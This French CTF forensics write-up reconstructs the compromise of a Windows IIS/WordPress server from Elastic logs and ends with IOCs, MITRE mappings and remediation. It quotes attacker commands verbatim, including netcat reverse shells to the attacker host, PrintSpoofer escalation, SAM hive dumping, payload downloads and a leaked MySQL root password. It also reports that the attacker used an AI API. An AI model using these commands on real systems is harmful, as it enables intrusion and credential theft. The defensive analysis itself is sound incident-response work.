@@ -1,0 +1,433 @@
+# The Gauntlet
+
+[Accueil](../../README.md) · [Forensics](../README.md) · [Index](../../INDEX.md)
+
+## Informations générales
+
+| Champ | Valeur |
+|---|---|
+| Nom | The Gauntlet |
+| Compétition | HackerLab Bénin 2026 |
+| Catégorie de classement | Forensics |
+| Difficulté | Non documentée |
+| Points | Non documentés |
+| Auteur | Non documenté |
+| Statut | **Partial** |
+| Technologies | Windows, Sysmon, IIS, PowerShell, Elastic, Packetbeat |
+| Validation | Aucune validation plateforme exportée |
+
+## 1. Introduction
+
+Reconstituer la compromission d’un serveur Windows à partir d’une investigation DFIR.
+
+Cette édition reconstruit les travaux conservés. Les commandes citées sont historiques, sauf mention explicite d’un contrôle documentaire local. Aucune cible n’a été contactée lors de la rédaction. Les paramètres d’accès et les réponses sont expurgés ; les remplacer depuis les artefacts autorisés pour une reproduction en laboratoire.
+
+**Limites et corrections de cette édition.** La base Elastic et les exports bruts ne sont pas présents. Les identifiants d’événements cités sont des références historiques, pas des preuves vérifiables dans ce dépôt. Le lien avec une API d’IA démontre des connexions, pas à lui seul une assistance opérationnelle. Une commande SELECT visant wp_users démontre une tentative de collecte ; sans résultat ou capture des données, le vol effectif ne doit pas être affirmé. Des HTTP 404 prouvent l’échec des requêtes observées, pas l’absence de toute autre exfiltration. L’accès non authentifié à Forminator est rapporté, mais sa cause précise et sa version ne sont pas démontrées ici.
+
+## 2. Énoncé du challenge
+
+- Questions originales non conservées ; rapport global et notes de navigation disponibles.
+
+## 3. Analyse initiale
+
+3 fichiers rattachés directement à ce dossier. Voir l’[inventaire des pièces](evidence/manifest.md), qui indique leur chemin d’origine, leur taille et la décision de publication. Les pièces partagées sont référencées dans les questions apparentées, sans recopier les archives.
+
+### 2. Périmètre et sources analysées
+
+Source : [rapport-the-gauntlet.md](evidence/dfir-rapport-the-gauntlet-md.txt)
+
+| Élément | Valeur |
+|---|---|
+| Plateforme | Kibana — espace `Hydra`, vue de données `DFIR Logs` (`.ds-logs-*, .ds-metrics-*`) |
+| Période | 2026-11-06 09:29:30 → 13:14:53 UTC (10:29:30 → 14:14:53 Africa/Porto-Novo) |
+| Volume | ~7 259 178 documents |
+| Hôte victime | `WIN-M16Q1KOG02O` (192.168.24.200) — Windows Server 2022, Elastic Agent 9.5.5 |
+| Sources exploitées | Sysmon (`windows.sysmon_operational`), journal de sécurité Windows (`winlog.security`), Elastic Defend (`endpoint.events.*`, `system.security`), PowerShell (`windows.powershell`, `windows.powershell_operational`, `filestream.ps_transcripts`), IIS (`iis.access`), Packetbeat (`network_traffic.flow/http/dns/tls`), planificateur (`winlog.taskscheduler`) |
+
+### Topologie réseau (corrélée)
+
+| IP | Rôle | Preuve |
+|---|---|---|
+| `192.168.24.200` | Victime `WIN-M16Q1KOG02O` | `host.ip` de tous les journaux hôte |
+| `192.168.24.128` | **Attaquant / C2** (et hôte Packetbeat = source de collecte) | shells inversés → `128:4444/5555/6666`, outils depuis `128:8080` |
+| `192.168.24.130` | Infrastructure Elastic (ES `9200`, Fleet `8220`, Kibana `5601`, SSH `22`) | flux victime→130:9200 (agent), 130:8220 (Fleet) |
+| `192.168.24.2` | Passerelle + résolveur DNS | — |
+| `192.168.24.254` | Serveur DHCP | — |
+| `160.79.104.10` | **`api.anthropic.com`** (API Claude) — utilisé par l'attaquant | 25 réponses DNS + 4 208 flux 443 depuis `.128` |
+| `104.21.19.74` / `172.67.185.159` | Cloudflare — `versioning.ctfd.io` (**leurre**, plateforme CTF) | DNS A/AAAA |
+
+---
+
+## 4. Reconnaissance et investigation
+
+### 3. Chronologie consolidée
+
+Source : [rapport-the-gauntlet.md](evidence/dfir-rapport-the-gauntlet-md.txt)
+
+Les horodatages sont donnés en **UTC** (heure des journaux) ; la colonne
+**UTC+1** est le fuseau local Africa/Porto-Novo.
+
+| UTC | UTC+1 | Action | Hôte/Compte | Preuve (source) |
+|---|---|---|---|---|
+| 09:31:48 | 10:31:48 | Premier GET `/` (recon web) | 128 → 200 | `iis.access` |
+| 09:32:32 | 10:32:32 | Scan fichiers (`/.git/HEAD`, `wp-config.*`, `nmaplowercheck`) | 128 | `iis.access` (404) |
+| 09:37:49–09:38:01 | 10:37–10:38 | **Brute-force `wp-login.php`** (11 428 POST au total) | 128 | `iis.access` |
+| **09:53:31** | **10:53:31** | **Upload webshell Forminator** (`php2B50.tmp` → `pkKnndRhc7df-shell.php`) + **1ʳᵉ commande `whoami`** | `php-cgi.exe` / `DefaultAppPool` | `endpoint.events.file` (rename), `iis.access` |
+| 09:56:34 | 10:56:34 | Shell inversé PowerShell encodé → `128:5555` | `DefaultAppPool` | `iis.access c=powershell -enc …` |
+| 09:59–10:05 | 10:59–11:05 | Téléchargement `rev.ps1` (IEX, certutil, DownloadFile) | `DefaultAppPool` | webshell + `Sysmon EID 3` |
+| 10:05:26 | 11:05:26 | `rev.ps1` exécuté → shell inversé `128:5555` | `powershell.exe` (PID 6064) | `Sysmon EID 3` |
+| 10:09–10:27 | 11:09–11:27 | Recon : `whoami`, `hostname`, `ipconfig`, `systeminfo`, `net user`, `net localgroup`, `ping 128`, `whoami /priv`, `netstat`, `arp`, `route`, `schtasks /query`, `findstr password` | `DefaultAppPool` (via shell inversé) | `Sysmon EID 1` (ProcessCreate) |
+| 10:24:49 / 10:27:37 | 11:24 / 11:27 | `IEX DownloadString` → `PowerUp.ps1` puis `PrivescCheck.ps1` | `DefaultAppPool` | `Sysmon EID 1` |
+| 10:56:13 | 11:56:13 | `Invoke-WebRequest PrintSpoofer64.exe` → `C:\Windows\Temp\ps.exe` | `DefaultAppPool` | `Sysmon EID 1` |
+| 10:58:00 | 11:58:00 | `Invoke-WebRequest nc.exe` → `C:\Windows\Temp\nc.exe` | `DefaultAppPool` | `Sysmon EID 1` |
+| **10:59:09** | **11:59:09** | **Élévation : `ps.exe -c "nc.exe 192.168.24.128 4444 -e powershell.exe"`** | PrintSpoofer → **SYSTEM** | `Sysmon EID 1` |
+| 10:59:11 | 11:59:11 | **Alerte EDR « Elastic Security detected ps.exe »** | `elastic-endpoint.exe` | `Sysmon EID 1` |
+| 10:59:14 | 11:59:14 | `nc.exe` → `128:4444` (shell inversé **SYSTEM**) | `nc.exe` (PID 8320) | `Sysmon EID 3` |
+| 11:11:49 | 12:11:49 | `reg save HKLM\SAM` → `...\uploads\sam.save` | SYSTEM | `Sysmon EID 1` |
+| 11:11:56 | 12:11:56 | **Création du fichier `sam.save`** | `reg.exe` | `Sysmon EID 11` |
+| 11:12:55 | 12:12:55 | `reg save HKLM\SYSTEM` → `system.save` (**échec, ruche verrouillée**) | SYSTEM | `Sysmon EID 1` |
+| 11:13:45 | 12:13:45 | **Tentative exfil `sam.save` → HTTP 404** | 128 | `iis.access` / `network_traffic.http` |
+| 11:14:03 / 11:14:29 | 12:14:03 / 12:14:29 | Tentative exfil `system.save` → **HTTP 404** | 128 | `iis.access` / `network_traffic.http` |
+| 11:16:08 | 12:16:08 | `net user svc_update <EXPURGE> /add` | SYSTEM | `Sysmon EID 1` |
+| 11:16:42 / 11:19:27 | 12:16 / 12:19 | `svc_update` → **Administrateurs** + **Remote Desktop Users** | SYSTEM | `Sysmon EID 1` |
+| 11:20:29 | 12:20:29 | **Logon RDP `svc_update`** (winlogon→userinit→explorer) | `svc_update` | `Sysmon EID 1` |
+| 11:25:44 | 12:25:44 | **Tâche planifiée `WindowsUpdateCheck`** → `nc.exe -e powershell 128 6666` (horaire, SYSTEM) | `svc_update` | `Sysmon EID 1` + `winlog.taskscheduler EID 106` |
+| 11:33:15 | 12:33:15 | **Clé Run `SecurityUpdate`** → PS inversé encodé vers `128:6666` | `svc_update` | `Sysmon EID 1` (reg.exe) |
+| 12:14:28 | 13:14:28 | Session SSH (`sshd.exe -z` en `svc_update`) → `cmd.exe` | `svc_update` | `Sysmon EID 1` |
+| **12:17:08–12:18:10** | **13:17–13:18** | **`mysql -u root -pMySQLR00t!` : `SHOW DATABASES` → `USE wordpress` → `SELECT user_login,user_pass,user_email FROM wp_users`** | `svc_update` | `Sysmon EID 1` |
+| **12:25:01** | **13:25:01** | **La tâche `WindowsUpdateCheck` se déclenche** : `nc.exe -e powershell 128 6666` (SYSTEM) | SYSTEM (Task Scheduler) | `Sysmon EID 1` + `taskscheduler EID 200` |
+| 12:25:10 | 13:25:10 | Flux réseau victime → `128:6666` (shell inversé actif) | 200 → 128 | `network_traffic.flow` |
+| 12:38:15 | 13:38:15 | `IEX PrivescCheck.ps1` (nouvelle passe) | `DefaultAppPool` | `Sysmon EID 1` |
+
+---
+
+## 5. Identification du mécanisme
+
+La corrélation rapproche création de processus, écritures de fichiers, trafic réseau et tâches planifiées. Une chaîne cohérente appuie une hypothèse d’incident, mais ne remplace pas les journaux primaires manquants.
+
+## 6. Exploitation ou résolution
+
+### 1. Résumé exécutif
+
+Source : [rapport-the-gauntlet.md](evidence/dfir-rapport-the-gauntlet-md.txt)
+
+**Constats rapportés par le rapport, sans journaux primaires conservés :**
+
+Le 6 novembre 2026, entre 09:29 et 13:14 UTC (10:29–14:14 Africa/Porto-Novo,
+UTC+1), le serveur web `WIN-M16Q1KOG02O` (192.168.24.200, Windows Server 2022)
+a été entièrement compromis. L'attaquant (192.168.24.128) a exploité un
+**upload de fichier non authentifié du plugin WordPress « Forminator »** pour
+déposer un **webshell PHP** (`pkKnndRhc7df-shell.php`), obtenant une exécution
+de code sous l'identité `IIS APPPOOL\DefaultAppPool`.
+
+À partir de là, l'attaquant a : (1) exécuté de la reconnaissance, (2) élevé ses
+privilèges à **SYSTEM** via **PrintSpoofer** (impersonation du service
+d'impression), (3) créé un compte administrateur `svc_update`, (4) installé deux
+mécanismes de persistance (tâche planifiée `WindowsUpdateCheck` + clé Run
+`SecurityUpdate`), et (5) tenté d'exfiltrer les ruches SAM/SYSTEM (échec HTTP,
+404) puis dérobé les identifiants WordPress via **MySQL**.
+
+L'attaquant interagit par ailleurs avec l'API **Anthropic (Claude)** pendant
+l'opération (`api.anthropic.com` → `160.79.104.10`), indice d'une attaque
+**assistée par IA**. La compromission a été détectée en temps réel par l'EDR
+(alerte « Elastic Security detected ps.exe » à 10:59 UTC), mais n'a pas été
+contenue.
+
+---
+
+### 4. Accès initial
+
+Source : [rapport-the-gauntlet.md](evidence/dfir-rapport-the-gauntlet-md.txt)
+
+**Constats rapportés par le rapport, sans journaux primaires conservés :**
+
+**Vecteur : exploitation d'application publique — upload de fichier non
+authentifié du plugin WordPress Forminator (T1190), suivi d'une exécution via
+webshell PHP.**
+
+- La cible héberge WordPress sur IIS/PHP (`w3wp.exe` → `php-cgi.exe`, pool
+  `DefaultAppPool`) avec MySQL.
+- Recon préalable : énumération `?author=1..10`, scan `wp-config.*`,
+  `nmaplowercheck`, `/.git/HEAD`, brute-force `wp-login.php` (11 428 POST).
+- **09:53:31 UTC** : `php-cgi.exe` **renomme** `C:\Windows\Temp\php2B50.tmp` en
+  `C:\inetpub\wwwroot\wp-content\uploads\forminator\59_eb3138037cd77a85cda14d6e687009c4\uploads\pkKnndRhc7df-shell.php`
+  (73 octets, en-tête `<?php if(isset($…` → shell `system($_GET['c'])`).
+- **09:53:31 UTC** : première commande `c=whoami`.
+
+**Distinction brute-force / accès obtenu** : la campagne `wp-login.php`
+(11 428 POST, source `192.168.24.128`) est une **tentative** ; aucun indice de
+session WordPress obtenue par ce biais (aucun accès wp-admin, aucun logon
+associé). L'accès effectif provient de l'**upload Forminator**, qui ne requiert
+**aucune authentification**.
+
+---
+
+### 5. Analyse technique
+
+Source : [rapport-the-gauntlet.md](evidence/dfir-rapport-the-gauntlet-md.txt)
+
+**Constats rapportés par le rapport, sans journaux primaires conservés :**
+
+### 5.1 Exécution & reconnaissance (T1059.001, T1059, TA0043)
+
+Le webshell exécute les commandes via `php-cgi.exe` (DefaultAppPool). La
+reconnaissance (`whoami`, `hostname`, `ipconfig /all`, `systeminfo`, `net user`,
+`net localgroup Administrateurs`, `ping 192.168.24.128`, `whoami /priv`,
+`netstat -ano`, `arp -a`, `route print`, `schtasks /query`,
+`findstr /si password C:\inetpub\*.config`) s'opère via un shell inversé
+PowerShell (`rev.ps1` → `128:5555`) entre 10:09 et 10:27 UTC.
+
+### 5.2 Élévation de privilèges (T1134 — PrintSpoofer)
+
+- `Invoke-WebRequest` télécharge `PrintSpoofer64.exe` (renommé `ps.exe`) et
+  `nc.exe` dans `C:\Windows\Temp`.
+- **10:59:09 UTC** : `ps.exe -c "nc.exe 192.168.24.128 4444 -e powershell.exe"`
+  — PrintSpoofer abuse le service Spouleur (SeImpersonatePrivilege) pour
+  lancer `nc.exe` en **SYSTEM**.
+- **10:59:11 UTC** : l'EDR Elastic affiche l'alerte
+  « Malware Alert: Elastic Security detected ps.exe ».
+- **10:59:14 UTC** : `nc.exe` établit le shell inversé SYSTEM vers `128:4444`.
+
+### 5.3 Accès aux identifiants (T1003.002)
+
+- `reg save HKLM\SAM` → `sam.save` créé (11:11:56 UTC, confirmé Sysmon EID 11).
+- `reg save HKLM\SYSTEM` → **échec** (ruche SYSTEM verrouillée, aucun fichier
+  `system.save` créé).
+- **Exfiltration HTTP tentée mais échouée** : `GET sam.save` (11:13:45) et
+  `GET system.save` (11:14:03, 11:14:29) retournent **404** — la récupération
+  des ruches via HTTP n'a pas abouti.
+
+### 5.4 Persistance (T1053.005, T1547.001, T1078)
+
+- **Tâche planifiée `\WindowsUpdateCheck`** : créée 11:25:44 UTC
+  (`schtasks /create … /ru SYSTEM /f`, confirmé `taskscheduler EID 106`),
+  action `C:\Windows\Temp\nc.exe -e powershell.exe 192.168.24.128 6666`,
+  cadence horaire. **Exécutée** 12:25:01 UTC (confirmé `taskscheduler EID 200`
+  + ProcessCreate `nc.exe` + flux `200→128:6666` à 12:25:10).
+- **Clé Run `SecurityUpdate`** : `reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v SecurityUpdate /d "powershell -w <EXPURGE> -EncodedCommand …"` (11:33:15 UTC).
+  Payload décodé : client TCP PowerShell interactif vers `192.168.24.128:6666`.
+  **Non déclenchée** pendant la fenêtre (aucun logon interactif ultérieur).
+- **Compte de secours `svc_update`** : créé (11:16:08), ajouté aux
+  Administrateurs (11:16:42) et aux « Utilisateurs du Bureau à distance »
+  (11:19:27), puis utilisé en RDP (11:20:29) et en SSH (12:14:28).
+
+### 5.5 Accès à distance / mouvement (T1021.001 RDP, T1021.004 SSH)
+
+- RDP `svc_update` à 11:20:29 UTC (chaîne winlogon→userinit→explorer).
+- SSH `sshd.exe` (session `svc_update`) à 12:14:28 UTC, spawnant `cmd.exe` puis
+  `mysql.exe`. **Aucun mouvement vers un second hôte Windows** : l'environnement
+  ne comporte qu'une seule victime (l'autre hôte observé, `5b65d382f6b4`, est le
+  Fleet Server — conteneur).
+
+### 5.6 Exfiltration de données (T1567, T1003, T1110.004)
+
+- Ruches SAM/SYSTEM : **tentative échouée** (HTTP 404).
+- **Base WordPress** : `mysql.exe -u root -pMySQLR00t!` sous `svc_update`
+  (12:17:08–12:18:10 UTC) : `SHOW DATABASES;` → `USE wordpress; SHOW TABLES;` →
+  `SELECT user_login, user_pass, user_email FROM wordpress.wp_users;` —
+  **vol des comptes et hashes WordPress**.
+
+### 5.7 Command & Control (T1105, T1571)
+
+| Canal | Détail | Preuve |
+|---|---|---|
+| `128:8080` (HTTP) | Serveur d'outils (rev.ps1, PowerUp.ps1, PrivescCheck.ps1, PrintSpoofer64.exe, nc.exe) | `Sysmon EID 3` ×8 (powershell.exe) |
+| `128:5555` | Shell inversé `rev.ps1` (×2 : 10:05:26, 10:55:12) | `Sysmon EID 3` ×2 |
+| `128:4444` | Shell inversé SYSTEM (PrintSpoofer, 10:59:14) | `Sysmon EID 3` ×1 |
+| `128:6666` | Shell inversé tâche planifiée (12:25:10) | `network_traffic.flow` (pas de Sysmon EID 3) |
+
+---
+
+### 6. Systèmes et comptes concernés
+
+Source : [rapport-the-gauntlet.md](evidence/dfir-rapport-the-gauntlet-md.txt)
+
+**Constats rapportés par le rapport, sans journaux primaires conservés :**
+
+| Système | Comptes impliqués |
+|---|---|
+| `WIN-M16Q1KOG02O` (192.168.24.200) | `IIS APPPOOL\DefaultAppPool` (accès initial), `SYSTEM` (post-élévation), `svc_update` (créé par l'attaquant, admin), `Administrateur` (session locale), comptes OpenSSH `sshd_*` (service) |
+
+---
+
+### 10. Annexe — preuves (échantillon des identifiants d'événements)
+
+Source : [rapport-the-gauntlet.md](evidence/dfir-rapport-the-gauntlet-md.txt)
+
+**Constats rapportés par le rapport, sans journaux primaires conservés :**
+
+| Heure (UTC) | Source | Événement / identifiant |
+|---|---|---|
+| 09:53:31.373 | `endpoint.events.file` | action `rename`, `php-cgi.exe`, cible `pkKnndRhc7df-shell.php` (header `<HEX_EXPURGE>`) |
+| 11:25:44.505 | `winlog.taskscheduler` EID 106 | `TaskName \WindowsUpdateCheck` |
+| 12:25:01.587 | `winlog.taskscheduler` EID 200 | action `C:\Windows\Temp\nc.exe` |
+| 11:11:56.256 | `windows.sysmon_operational` EID 11 | `reg.exe` → `sam.save` (FileCreate) |
+| 10:59:14.749 | `windows.sysmon_operational` EID 3 | `nc.exe` (PID 8320) → `192.168.24.128:4444` |
+| 10:05:26.540 / 10:55:12.085 | `windows.sysmon_operational` EID 3 | `powershell.exe` → `192.168.24.128:5555` |
+| 10:24:52 → 12:38:15 | `windows.sysmon_operational` EID 3 | `powershell.exe` → `192.168.24.128:8080` (×8) |
+| 12:25:10.135 | `network_traffic.flow` | `192.168.24.200` → `192.168.24.128:6666` |
+| 11:13:45 / 11:14:03 / 11:14:29 | `iis.access` + `network_traffic.http` | `GET sam.save/system.save` → **404** |
+| 11:33:15 | `windows.sysmon_operational` EID 1 | `reg.exe add …Run /v SecurityUpdate /d "powershell -w <EXPURGE> -EncodedCommand …"` |
+| 10:59:09 | `windows.sysmon_operational` EID 1 | `ps.exe -c "nc.exe 192.168.24.128 4444 -e powershell.exe"` |
+| 10:59:11 | `windows.sysmon_operational` EID 1 | `elastic-endpoint.exe popup "Malware Alert … ps.exe"` |
+
+---
+
+## 7. Scripts et automatisation
+
+Aucun script autonome rattaché directement à cette question. Les commandes intégrées aux notes sont reproduites lorsqu’elles existent ; elles ne sont pas déclarées testées dans cette édition.
+
+## 8. Questions et flags
+
+Les réponses ne sont pas publiées, conformément à la règle locale de non-divulgation. Un signalement au hub ne vaut pas acceptation par la compétition.
+
+| Question / objectif | Méthode et preuve | Réponse | Validation |
+|---|---|---|---|
+| Questions originales non conservées ; rapport global et notes de navigation disponibles. | Voir la reconstruction et les sources de ce dossier. | Non reproduite / inconnue si non résolue | Aucune validation plateforme exportée |
+
+## 9. Difficultés rencontrées
+
+Aucune tentative infructueuse n’est consignée dans les sources rattachées. Cela ne prouve pas qu’il n’y en a pas eu. Les limites matérielles sont indiquées dans l’introduction.
+
+## 10. Analyse technique approfondie
+
+### 7. Correspondance MITRE ATT&CK
+
+Source : [rapport-the-gauntlet.md](evidence/dfir-rapport-the-gauntlet-md.txt)
+
+**Constats rapportés par le rapport, sans journaux primaires conservés :**
+
+| Tactique | Technique | ID |
+|---|---|---|
+| Initial Access | Exploit Public-Facing Application (upload Forminator) | T1190 |
+| Initial Access | Brute Force (wp-login) — **tentative sans succès** | T1110 |
+| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 |
+| Execution | Server Software Component (webshell PHP) | T1505.003 |
+| Privilege Escalation | Access Token Manipulation (PrintSpoofer/"Potato") | T1134 |
+| Credential Access | OS Credential Dumping: Security Account Manager | T1003.002 |
+| Credential Access | Unsecured Credentials (MySQL root, hashes WP) | T1552 |
+| Persistence | Scheduled Task/Job | T1053.005 |
+| Persistence | Boot or Logon Autostart: Registry Run Keys | T1547.001 |
+| Persistence | Valid Accounts (`svc_update`) | T1078 |
+| Lateral Movement | Remote Desktop Protocol | T1021.001 |
+| Lateral Movement | SSH | T1021.004 |
+| Command and Control | Ingress Tool Transfer | T1105 |
+| Command and Control | Non-Standard Ports | T1571 |
+| Exfiltration | Exfiltration Over Web Service (tentative) | T1567 |
+| Collection | Data from Local System (hives, BDD) | T1005 |
+
+---
+
+### 8. Indicateurs de compromission (IOC)
+
+Source : [rapport-the-gauntlet.md](evidence/dfir-rapport-the-gauntlet-md.txt)
+
+**Constats rapportés par le rapport, sans journaux primaires conservés :**
+
+### Réseau
+- `192.168.24.128` — C2 / hôte attaquant (serveur d'outils `:8080`, shells `:4444/5555/6666`).
+- `160.79.104.10` (`api.anthropic.com`) — API Claude utilisée par l'attaquant (≠ C2, mais indice d'attaque assistée IA).
+- Ports sortants inhabituels : `4444`, `5555`, `6666`.
+
+### Fichiers
+- `C:\inetpub\wwwroot\wp-content\uploads\forminator\59_eb3138037cd77a85cda14d6e687009c4\uploads\pkKnndRhc7df-shell.php` (webshell).
+- `C:\Windows\Temp\rev.ps1`, `C:\Windows\Temp\nc.exe`, `C:\Windows\Temp\ps.exe` (PrintSpoofer64).
+
+### Hôte
+- Tâche planifiée `\WindowsUpdateCheck`.
+- Clé registre `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SecurityUpdate`.
+- Compte local `svc_update` (admin + RDP).
+- Usage credential MySQL `root`/`<EXPURGE>`.
+
+### Leurres écartés
+- `versioning.ctfd.io` (Cloudflare) — plateforme CTF, non malveillante.
+- `example.org` — canary DNS régulier (cadence uniforme dès 09:25), non malveillant.
+- `api.anthropic.com` côté victime : inexistant (les requêtes proviennent de `.128`).
+
+---
+
+### 9. Impact
+
+Source : [rapport-the-gauntlet.md](evidence/dfir-rapport-the-gauntlet-md.txt)
+
+**Constats rapportés par le rapport, sans journaux primaires conservés :**
+
+- **Compromission complète** du serveur web (SYSTEM obtenu).
+- **Vol de données** : comptes et hashes WordPress (`wp_users`) exfiltrés via MySQL ; tentative d'exfiltration des ruches SAM/SYSTEM (échouée côté HTTP).
+- **Persistance active** : tâche planifiée horaire (shell inversé SYSTEM) confirmée exécutée ; clé Run en attente d'un prochain logon.
+- **Porte dérobée** : compte `svc_update` (admin + RDP + SSH).
+- **Détection** : EDR alerté (ps.exe) à 10:59 UTC mais non suivi de remédiation.
+
+---
+
+### 11. Faits confirmés / hypothèses / inconnus
+
+Source : [rapport-the-gauntlet.md](evidence/dfir-rapport-the-gauntlet-md.txt)
+
+**Constats rapportés par le rapport, sans journaux primaires conservés :**
+
+**Faits confirmés (preuve directe)**
+- Accès initial par webshell Forminator (09:53:31 UTC).
+- Élévation SYSTEM via PrintSpoofer (10:59:09) et alerte EDR (10:59:11).
+- Création `svc_update` (admin/RDP) et ses deux usages (RDP 11:20, SSH 12:14).
+- Persistance : tâche `WindowsUpdateCheck` créée (11:25) **et** exécutée (12:25) ; clé Run créée (11:33).
+- Vol MySQL des comptes WP (12:17–12:18).
+- Échec de l'exfiltration HTTP des ruches (404).
+
+**Hypothèses (corrélation forte, à confirmer)**
+- L'attaquant utilise l'API Anthropic (attaque assistée IA) : les requêtes
+  `api.anthropic.com` proviennent exclusivement de `.128`. *(Non attribué à un
+  acteur précis.)*
+
+**Inconnus / limites**
+- Pourquoi `system.save` et `sam.save` n'ont pas été servis (404) alors que
+  `sam.save` a bien été créé : extension `.save` non servie par IIS, suppression
+  par l'EDR, ou décalage de chemin — non tranché.
+- Contenu exact de `rev.ps1` (non reconstitué intégralement).
+- Les flux `128 → 130:22` (SSH constant ~800/15 min) n'ont pas pu être attribués
+  à une action malveillante : cadence uniforme sur toute la fenêtre, compatible
+  avec le canal de gestion de l'hôte Packetbeat.
+- Un décalage `@timestamp` (UTC) vs `UtcTime` (message) d'environ 1 h a été noté
+  dans l'interface (affichage fuseau) : ce rapport s'appuie sur les horodatages
+  UTC de l'API.
+
+---
+
+## 11. Remédiations
+
+Corriger le composant d’upload, interdire l’exécution dans les répertoires de dépôt, limiter les privilèges du pool IIS, surveiller les créations de comptes, tâches et clés Run ; restreindre les communications sortantes.
+
+### 12. Conclusions et recommandations
+
+Source : [rapport-the-gauntlet.md](evidence/dfir-rapport-the-gauntlet-md.txt)
+
+1. **Contenir immédiatement** : isoler `192.168.24.200`, révoquer `svc_update`,
+   supprimer la tâche `WindowsUpdateCheck` et la clé Run `SecurityUpdate`,
+   supprimer le webshell et les fichiers `nc.exe`/`ps.exe`/`rev.ps1`.
+2. **Corriger la cause racine** : mettre à jour/supprimer le plugin Forminator
+   (CVE d'upload non authentifié), durcir IIS (désactiver l'exécution PHP dans
+   `wp-content/uploads`), rotation du mot de passe MySQL root.
+3. **Rejouer l'exfiltration** : confirmer si les ruches ont transité par un autre
+   canal (le shell SYSTEM inversé) malgré l'échec HTTP ; forcer la rotation des
+   secrets et des hashes WP.
+4. **Durcir la détection** : alerte sur `PrintSpoofer`/`nc.exe`/`reg save HKLM\SAM`,
+   connexions sortantes vers ports non standards (4444/5555/6666), création de
+   comptes admin et de tâches planifiées suspectes.
+5. **Surveiller l'infra SIEM** : clarifier la nature des flux `128→130` et
+   vérifier l'absence de compromission du collecteur Packetbeat.
+
+## 12. Conclusion
+
+Reconstituer la compromission d’un serveur Windows à partir d’une investigation DFIR. La documentation disponible permet une reconstruction détaillée. Statut retenu : Partial. Aucune validation plateforme exportée.
+
+## 13. Références
+
+Les références sont les pièces locales ci-dessous. Les références Internet citées dans les notes restent historiques et n’ont pas été consultées pendant cette mission.
+
+- [rapport-the-gauntlet.md](evidence/dfir-rapport-the-gauntlet-md.txt) — origine : `dfir/rapport-the-gauntlet.md`.
+
+- [dfir-observations.md](evidence/dfir-work-dfir-observations-md.txt) — origine : `dfir/.work/dfir-observations.md`.
+
+- [Inventaire local des pièces](evidence/manifest.md).
+- [Retour à l’index](../../INDEX.md).
+
